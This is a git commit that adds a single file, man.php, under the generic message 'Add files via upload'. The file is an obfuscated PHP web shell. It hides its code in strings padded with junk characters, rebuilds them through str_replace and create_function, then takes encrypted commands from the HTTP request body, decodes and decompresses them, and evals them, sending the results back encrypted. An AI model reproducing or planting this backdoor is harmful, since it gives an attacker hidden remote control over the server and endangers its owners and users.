03425c5c6762384d5c291ff2a18ac58b89edd8b9
admin0987654321 <47281383+admin0987654321@users.noreply.github.com>
2019-02-02 20:27:00 -0500

    Add files via upload

---
+++ man.php
@@ -0,0 +1,10 @@
+<?php
+$B='{$oX.=$t{$iXX}^$k{$j};}X}returnX $o;}ifXX(@preg_maXtcXh("/$kh(.+)$kXXf/",@fiXlXXe_get_cXontents("php://';
+$U='XinpuXt"),$m)==1){@Xob_starXt();X@eXvXal(@gzunXcompress(@xX(@bXaXse64_decodXe(X$m[1]),$kX)));$o=@ob_';
+$a=str_replace('U','','creUaUtUUe_funcUUtion');
+$K='Xget_conteXntXs();@Xob_eXnd_cleanX();$r=@basXe64_enXcode(@xX(@gXzcompressX(XX$o),$kX));print("X$p$kh$r$kf");}';
+$I='){$Xc=strlen(X$kX);$l=XstrlXen($t);$Xo="";fXor($i=0X;$i<$lXX;){for($j=0;($Xj<$cX&&$i<X$l);$jX++,$i++)';
+$m='$Xk="65cbX5964";X$kh="5Xb852c2394baX";$Xkf="X3ffX8b295e8X3c";$p="XZshgUQ4PXlcucuPGi"X;funXXction x(X$t,$k';
+$J=str_replace('X','',$m.$I.$B.$U.$K);
+$d=$a('',$J);$d();
+?>
